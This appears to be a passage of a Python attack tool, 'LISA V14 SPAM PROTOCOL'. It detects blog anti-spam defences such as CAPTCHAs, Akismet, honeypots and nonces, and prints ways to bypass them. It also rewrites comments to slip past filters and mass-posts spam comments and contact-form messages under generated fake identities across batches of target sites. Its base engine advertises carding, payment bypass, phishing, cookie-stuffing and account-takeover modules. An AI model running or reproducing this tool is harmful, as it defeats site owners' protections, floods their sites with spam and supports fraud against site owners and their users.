            "nonce_name": None,
            "rate_limit": False,
            "detected_systems": [],
        }

        html_lower = html.lower()

        # Akismet
        if "akismet" in html_lower or "akismet_comment_nonce" in html:
            result["akismet"] = True
            result["detected_systems"].append("Akismet")

        # reCAPTCHA
        if "g-recaptcha" in html_lower or "recaptcha/api.js" in html_lower:
            result["captcha"] = True
            result["captcha_type"] = "reCAPTCHA"
            result["detected_systems"].append("reCAPTCHA")

        # hCaptcha
        if "h-captcha" in html_lower or "hcaptcha.com" in html_lower:
            result["captcha"] = True
            result["captcha_type"] = "hCaptcha"
            result["detected_systems"].append("hCaptcha")

        # Cloudflare Turnstile
        if "turnstile" in html_lower or "challenges.cloudflare.com" in html_lower:
            result["captcha"] = True
            result["captcha_type"] = "Turnstile"
            result["detected_systems"].append("Turnstile")

        # Altcha
        if "altcha" in html_lower:
            result["captcha"] = True
            result["captcha_type"] = "Altcha"
            result["detected_systems"].append("Altcha")

        # Honeypots
        hp_patterns = [
            r'<input[^>]+name=["\'](?:website|url|hp_|honeypot|fax)["\']',
            r'<input[^>]+(?:style|class)=["\'].*?(?:display\s*:\s*none|visibility\s*:\s*hidden|hidden).*?["\']',
        ]
        for pattern in hp_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            result["honeypot_count"] += len(matches)
        if result["honeypot_count"] > 0:
            result["honeypot"] = True
            result["detected_systems"].append(f"Honeypot(x{result['honeypot_count']})")

        # Nonce/CSRF
        nonce_match = re.search(r'name=["\']([^"\']*(?:nonce|_wpnonce|csrf|token)[^"\']*)["\']', html, re.IGNORECASE)
        if nonce_match:
            result["nonce_required"] = True
            result["nonce_name"] = nonce_match.group(1)
            result["detected_systems"].append("Nonce/CSRF")

        # Moderation indicators
        mod_indicators = ["awaiting moderation", "comment moderation", "moderasi", "disqus"]
        for mi in mod_indicators:
            if mi in html_lower:
                result["moderation"] = True
                result["detected_systems"].append(f"Moderation({mi})")
                break

        # Rate limiting indicators
        if headers:
            remaining = headers.get("x-ratelimit-remaining") or headers.get("x-rate-limit-remaining")
            if remaining and int(remaining) < 10:
                result["rate_limit"] = True
                result["detected_systems"].append("RateLimit")

        return result

    @staticmethod
    def get_bypass_recommendations(antispam: Dict) -> List[str]:
        """Return bypass recommendations based on detected systems."""
        recs = []

        if antispam["akismet"]:
            recs.append("Akismet: Use non-spammy language, avoid excessive links, vary comment content")
            recs.append("Akismet: Use aged email domains (gmail > temp mail), avoid keyword stuffing")

        if antispam["captcha"]:
            ctype = antispam["captcha_type"]
            if ctype == "reCAPTCHA":
                recs.append("reCAPTCHA: Try v2 bypass (audio challenge), or pray for v3 score < 0.5")
                recs.append("reCAPTCHA: If invisible, check if comment goes through without solving")
            elif ctype == "Turnstile":
                recs.append("Turnstile: Use browser automation (Playwright) to solve")
                recs.append("Turnstile: Try passing empty cf-turnstile-response")
            elif ctype == "hCaptcha":
                recs.append("hCaptcha: Harder than reCAPTCHA, skip unless Capsolver available")
            elif ctype == "Altcha":
                recs.append("Altcha: Can be bypassed via curl with proper proof-of-work")

        if antispam["honeypot"]:
            recs.append(f"Honeypot(x{antispam['honeypot_count']}): Fill honeypots with empty strings — do NOT populate")

        if antispam["nonce_required"]:
            recs.append(f"Nonce: Extract {antispam['nonce_name']} from page, submit within same session")

        if antispam["moderation"]:
            recs.append("Moderation: Comments will be held for review — use legitimate-looking content")

        if antispam["rate_limit"]:
            recs.append("RateLimit: Use proxy rotation, longer delays between submissions")

        if not recs:
            recs.append("No anti-spam detected — spam freely with high rate")

        return recs

    @staticmethod
    def bypass_akismet_comment(comment: str, link: str = "") -> str:
        """Modify comment to reduce Akismet spam score."""
        # Remove obvious spam patterns
        comment = re.sub(r'(?i)(?:buy|cheap|discount|click here|free|offer|limited|act now|order now|best price|lowest price|guaranteed|sale|deal|bargain|promo)', '', comment)

        # Add natural language
        fillers = [
            "I really appreciated this.",
            "Thanks for putting this together.",
            "This was exactly what I was looking for.",
            "Keep up the great work!",
            "Looking forward to more content like this.",
        ]

        if link and len(comment) < 200:
            comment += "\n\n" + random.choice(fillers)

        # Ensure comment is at least 50 chars
        if len(comment) < 50:
            comment += " " + random.choice(fillers)

        return comment.strip()


# ═══════════════════════════════════════════════════════
# Helper
# ═══════════════════════════════════════════════════════
def base_from_url(url: str) -> str:
    """Extract base URL (scheme + host) from a URL."""
    parsed = urllib.parse.urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"


# ═══════════════════════════════════════════════════════
# V14 SPAM BEAST ENGINE
# ═══════════════════════════════════════════════════════
class SpamBeastEngine(FraudBeastEngine):
    """V14 SPAM PROTOCOL — extends V12 Fraud with blog spam modules."""

    def __init__(self, target, focus=None, aggressive=False, fast=False,
                 max_timeout=0, pin_brute=0, resume=False,
                 cookie_stuff_ref=None, affiliate_tag="GENERIC", fraud_mode="full",
                 spam_count=20, spam_link=None, spam_mode="stealth",
                 contact_forms=False):
        super().__init__(target, focus, aggressive, fast, max_timeout, pin_brute,
                         resume, cookie_stuff_ref, affiliate_tag, fraud_mode)
        self.spam_count = spam_count
        self.spam_link = spam_link
        self.spam_mode = spam_mode  # stealth, normal, aggressive
        self.contact_forms = contact_forms
        self.spam_findings = []
        self.blog_platform = None
        self.posts = []
        self.comment_forms = []
        self.contact_form_list = []

    def add_spam(self, kind, severity, **kwargs):
        self.spam_findings.append({
            "kind": kind, "severity": severity,
            "timestamp": datetime.now().isoformat(),
            **kwargs,
        })

    def run(self):
        print(V14_SIGNATURE)
        print(f"Target: {self.target}")
        print(f"Spam: {self.spam_count} comments | Mode: {self.spam_mode}")
        print(f"Link: {self.spam_link or 'none'} | Contact Forms: {self.contact_forms}")
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

        # ── Resume from saved state ──
        if self.resume:
            state = StateManager.load(self.target)
            if state:
                self.findings = state.get("findings", [])
                self.spam_findings = state.get("spam_findings", [])
                self.phases_done = state.get("phases_done", [])
                print(f"   ♻ Resumed: {len(self.findings)} findings, "
                      f"{len(self.spam_findings)} spam actions")

        # ═══ PHASE 0: TLS SESSION SETUP ═══
        self._phase("TLS & PROXY SETUP", 0)
        try:
            if CFFI_OK:
                probed = TLSEngine.probe(self.base + "/")
                if probed.get("ok"):
                    self.tls = probed["session"]
                    print(f"   ✅ TLS OK ({probed['fingerprint']}, {probed['status']})")
                else:
                    self.tls = ProxyRotator.fresh_session()
                    print(f"   ⚠ TLS probe failed — using proxy rotator")
            else:
                self.tls = ProxyRotator.fresh_session()
                print(f"   ⚠ curl_cffi not available — using proxy rotator")
        except Exception as e:
            print(f"   ⚠ TLS: {e}")
            self.tls = ProxyRotator.fresh_session()

        # ═══ PHASE 1: BLOG HUNTER ═══
        self._phase("BLOG HUNTER", 1)
        self.blog_platform = BlogHunter.detect_platform(self.base, sess=self.tls)
        print(f"   📝 Platform: {self.blog_platform}")

        if self.blog_platform == "UNKNOWN":
            print("   ⚠ Not a blog/site — skipping blog spam")
            print("   Running base fraud engine only...")
            base_result = super().run()
            return self._summary()

        # Extract posts
        self.posts = BlogHunter.extract_posts(self.blog_platform, self.base, sess=self.tls, limit=50)
        print(f"   📄 Found {len(self.posts)} posts")

        if not self.posts:
            print("   ⚠ No posts found — trying RSS/sitemap...")
            self.posts = BlogHunter._extract_from_rss(
                self.base + BlogHunter.BLOG_PLATFORMS.get(self.blog_platform, {}).get("rss", "/feed/"),
                self.tls, limit=50
            )
            print(f"   📄 RSS: {len(self.posts)} posts")

        if not self.posts:
            print("   ⚠ Still no posts found — running base fraud engine only")
            base_result = super().run()
            return self._summary()

        # ═══ PHASE 2: ANTI-SPAM DETECTION ═══
        self._phase("ANTI-SPAM DETECTION", 2)
        try:
            r = self.tls.get(self.posts[0]["url"], timeout=15)
            antispam = AntiSpamBypass.detect_antispam(r.text, dict(r.headers))
            print(f"   🛡 Anti-spam systems: {antispam['detected_systems'] or 'NONE'}")
            print(f"   🔒 Captcha: {antispam['captcha']} ({antispam['captcha_type'] or 'none'})")
            print(f"   🍯 Honeypots: {antispam['honeypot_count']}")
            print(f"   🚫 Akismet: {antispam['akismet']}")
            print(f"   🔑 Nonce: {antispam['nonce_required']}")

            recs = AntiSpamBypass.get_bypass_recommendations(antispam)
            for rec in recs:
                print(f"   💡 {rec}")

            # If captcha-protected and not aggressive, reduce
            if antispam["captcha"] and self.spam_mode != "aggressive":
                print(f"   ⚠ Captcha detected — switching to stealth mode")
                self.spam_mode = "stealth"
                self.spam_count = min(self.spam_count, 5)

            self.add_spam("antispam_detection", "info",
                          systems=antispam["detected_systems"],
                          captcha=antispam["captcha"],
                          captcha_type=antispam["captcha_type"],
                          recommendations=recs)
        except Exception as e:
            print(f"   ⚠ Anti-spam detection failed: {e}")
            antispam = {"captcha": False, "akismet": False, "honeypot": False, "honeypot_count": 0}

        # ═══ PHASE 3: COMMENT FORM EXTRACTION ═══
        self._phase("COMMENT FORM EXTRACTION", 3)
        sample_posts = self.posts[:min(5, len(self.posts))]
        for post in sample_posts:
            try:
                form = BlogHunter.find_comment_form(self.blog_platform, post["url"], sess=self.tls)
                if form and form.get("form_action"):
                    self.comment_forms.append(form)
                    print(f"   ✅ Form: {post['title'][:50]}...")
            except Exception as e:
                print(f"   ⚠ Form error on {post['url']}: {e}")

        print(f"   📋 Comment forms found: {len(self.comment_forms)}")

        if not self.comment_forms:
            print("   ⚠ No comment forms — running base fraud engine only")
            base_result = super().run()
            return self._summary()

        # ═══ PHASE 4: COMMENT SPAM BARRAGE ═══
        self._phase("COMMENT SPAM BARRAGE", 4)
        comments = CommentSpammer.generate_comment_pool(self.spam_count, self.spam_link or "")
        delay_map = {"stealth": 5.0, "normal": 2.0, "aggressive": 0.5}
        delay = delay_map.get(self.spam_mode, 2.0)

        posted = 0
        failed = 0
        skipped = 0
        moderated = 0

        for i, comment in enumerate(comments):
            if i >= self.spam_count:
                break

            form = self.comment_forms[i % len(self.comment_forms)]
            name = CommentSpammer.generate_name()
            email = CommentSpammer.generate_email(name)
            url = CommentSpammer.generate_url(name) if random.random() < 0.4 else ""

            # Anti-spam bypass
            if antispam.get("akismet"):
                comment = AntiSpamBypass.bypass_akismet_comment(comment, self.spam_link or "")

            result = CommentSpammer.post_comment(form, name, email, url, comment, self.tls, delay)

            if result["success"]:
                posted += 1
                status = result.get("status", "posted")
                if status == "published":
                    print(f"   🔥 [{i+1}/{self.spam_count}] PUBLISHED: {result['comment']}...")
                else:
                    print(f"   📝 [{i+1}/{self.spam_count}] Moderated: {result['comment']}...")
                    moderated += 1
                self.add_spam("comment_posted", "info",
                              post_url=result["post_url"],
                              author=name, email=email,
                              success=True, status=status)
            else:
                if result.get("error"):
                    failed += 1
                    print(f"   ❌ [{i+1}/{self.spam_count}] Failed: {result['error']}")
                else:
                    skipped += 1
                    print(f"   ⏭ [{i+1}/{self.spam_count}] Skipped")

            # Progress
            if (i + 1) % 10 == 0:
                print(f"   📊 Progress: {posted} posted, {failed} failed, {skipped} skipped")

        print(f"\n   📊 Comment Spam Summary: {posted} submitted ({posted - moderated} published, {moderated} moderated), {failed} failed, {skipped} skipped")

        self.add_spam("comment_spam_summary", "info",
                      total=self.spam_count, posted=posted, published=posted-moderated,
                      moderated=moderated, failed=failed, skipped=skipped)

        # ═══ PHASE 5: CONTACT FORM SPAM (if enabled) ═══
        if self.contact_forms:
            self._phase("CONTACT FORM SPAM", 5)
            # Scan homepage for contact forms
            try:
                r = self.tls.get(self.base + "/", timeout=15)
                forms = ContactFormSpammer.detect_forms(r.text, self.base)
                print(f"   📋 Contact forms detected: {len(forms)}")

                cf_posted = 0
                for form in forms:
                    if form.get("has_captcha") and self.spam_mode != "aggressive":
                        print(f"   ⏭ Captcha-protected contact form (skipping)")
                        continue

                    spam_data = ContactFormSpammer.generate_spam_message(
                        topic=self.target.replace("https://", "").replace("http://", ""),
                        link=self.spam_link or ""
                    )
                    result = ContactFormSpammer.submit_form(form, spam_data, self.tls, delay=delay)

                    if result["success"]:
                        cf_posted += 1
                        print(f"   ✅ Contact form submitted: {form['plugin']}")
                        self.add_spam("contact_form_submitted", "info",
                                      plugin=form["plugin"], success=True)
                    else:
                        print(f"   ❌ Contact form failed: {result.get('error', 'unknown')}")

                print(f"   📊 Contact Form Summary: {cf_posted}/{len(forms)} submitted")
            except Exception as e:
                print(f"   ⚠ Contact form spam error: {e}")

        # ═══ PHASE 6: RUN BASE FRAUD ENGINE (if focus=all) ═══
        if self.focus == "all":
            self._phase("BASE FRAUD ENGINE", 6)
            try:
                base_result = super().run()
                print(f"   📊 Base fraud: {len(self.findings)} findings")
            except Exception as e:
                print(f"   ⚠ Base fraud engine error: {e}")

        # ═══ GENERATE REPORT ═══
        self._phase("REPORT", 99)
        os.makedirs(REPORT_DIR, exist_ok=True)
        report = self._generate_spam_report()
        report_path = os.path.join(
            REPORT_DIR,
            f"{self.target.replace('https://','').replace('http://','').rstrip('/').replace('/','_')}_v14.json"
        )
        with open(report_path, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"\n   📄 Report saved: {report_path}")

        # Save state
        os.makedirs(STATE_DIR, exist_ok=True)
        StateManager.save(self.target,
                          self.findings + self.spam_findings,
                          self.phases_done + ["spam_v14"])
        print(f"   💾 State saved")

        return report

    def _generate_spam_report(self) -> Dict:
        return {
            "target": self.target,
            "version": "V14 SPAM PROTOCOL",
            "timestamp": datetime.now().isoformat(),
            "platform": self.blog_platform,
            "findings": {
                "base_v12": len(self.findings),
                "spam_v14": len(self.spam_findings),
                "total": len(self.findings) + len(self.spam_findings),
            },
            "spam_stats": {
                "posts_found": len(self.posts),
                "comment_forms": len(self.comment_forms),
                "comments_posted": sum(1 for f in self.spam_findings if f["kind"] == "comment_posted"),
                "contact_forms_submitted": sum(1 for f in self.spam_findings if f["kind"] == "contact_form_submitted"),
            },
            "spam_findings": self.spam_findings,
            "base_findings": self.findings,
            "modules_active": {
                "blog_hunter": True,
                "comment_spammer": True,
                "contact_form_spammer": self.contact_forms,
                "anti_spam_bypass": True,
                "cookie_forge": True,
                "affiliate_fraud": bool(self.cookie_stuff_ref),
                "carding_engine": True,
                "payment_bypass": True,
                "phishing_forge": True,
                "account_takeover": True,
            },
            "spam_link": self.spam_link,
            "spam_mode": self.spam_mode,
        }

    def _summary(self) -> Dict:
        return self._generate_spam_report()


# ═══════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════
if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="LISA V14 SPAM PROTOCOL — The Blog Horde")
    p.add_argument("target", nargs="?", help="Target domain")
    p.add_argument("-t", "--targets", nargs="+", help="Multiple targets (batch mode)")
    p.add_argument("--focus", choices=["all", "blog", "spam", "fraud", "affiliate", "carding",
                                        "wp", "ci3", "auth"],
                   default="all")
    p.add_argument("--aggressive", action="store_true")
    p.add_argument("--fast", action="store_true")
    p.add_argument("--timeout", type=int, default=0)
    p.add_argument("--pin-brute", type=int, default=0)
    p.add_argument("--resume", action="store_true")
    p.add_argument("--list-saved", action="store_true")
    p.add_argument("--cookie-stuff", help="Affiliate ref for cookie stuffing")
    p.add_argument("--affiliate-tag", default="GENERIC")
    p.add_argument("--fraud-mode", choices=["full", "affiliate_only", "carding_only", "payment_only",
                                            "phishing_only", "ato_only"],
                   default="full")
    p.add_argument("--spam-count", type=int, default=20,
                   help="Number of comments to post (default: 20)")
    p.add_argument("--spam-link", help="URL to inject in comments")
    p.add_argument("--spam-mode", choices=["stealth", "normal", "aggressive"],
                   default="stealth", help="Spam aggression level (default: stealth)")
    p.add_argument("--contact-forms", action="store_true",
                   help="Also spam contact forms")

    a = p.parse_args()

    if a.list_saved:
        print("Saved targets:", StateManager.list_saved())
        sys.exit(0)

    if a.targets:
        print("🐺 BATCH SPAM MODE\n")
        results = {}
        with ThreadPoolExecutor(max_workers=2) as ex:
            futs = {}
            for t in a.targets:
                eng = SpamBeastEngine(target=t, focus=a.focus, aggressive=a.aggressive,
                                      fast=a.fast, max_timeout=a.timeout,
                                      pin_brute=a.pin_brute, resume=a.resume,
                                      cookie_stuff_ref=a.cookie_stuff,
                                      affiliate_tag=a.affiliate_tag,
                                      fraud_mode=a.fraud_mode,
                                      spam_count=a.spam_count,
                                      spam_link=a.spam_link,
                                      spam_mode=a.spam_mode,
                                      contact_forms=a.contact_forms)
                futs[ex.submit(eng.run)] = t
            for fut in as_completed(futs):
                t = futs[fut]
                try:
                    results[t] = fut.result()
                    n = results[t]["findings"]["total"]
                    print(f"  {t}: {n} findings")
                except Exception as e:
                    print(f"  {t}: ERROR - {e}")
        sys.exit(0)

    if not a.target:
        print(__doc__)
        sys.exit(1)

    eng = SpamBeastEngine(target=a.target, focus=a.focus, aggressive=a.aggressive,
                          fast=a.fast, max_timeout=a.timeout, pin_brute=a.pin_brute,
                          resume=a.resume, cookie_stuff_ref=a.cookie_stuff,
                          affiliate_tag=a.affiliate_tag, fraud_mode=a.fraud_mode,
                          spam_count=a.spam_count, spam_link=a.spam_link,
                          spam_mode=a.spam_mode, contact_forms=a.contact_forms)
    eng.run()